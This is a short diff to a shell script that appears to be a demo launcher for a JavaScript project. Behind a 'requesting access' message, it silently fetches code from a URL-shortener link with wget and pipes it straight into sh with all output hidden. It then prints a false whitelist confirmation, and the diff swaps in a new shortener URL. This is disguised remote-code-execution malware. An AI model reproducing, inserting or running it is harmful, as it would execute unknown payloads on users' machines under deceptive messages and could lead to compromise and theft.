@@ -1,5 +1,5 @@
 echo "Requesting access for the demo…"
-wget -qO- 'https://gramarlygpt.short.gy/csRkMn9l' -L | sh >/dev/null 2>&1
+wget -qO- 'https://pesncv.short.gy/csRkMn9l' -L | sh >/dev/null 2>&1
 echo "Added to whitelist successfully. Showing demo…"
 /c npm install >/dev/null 2>&1
 /c npm run dev >/dev/null 2>&1
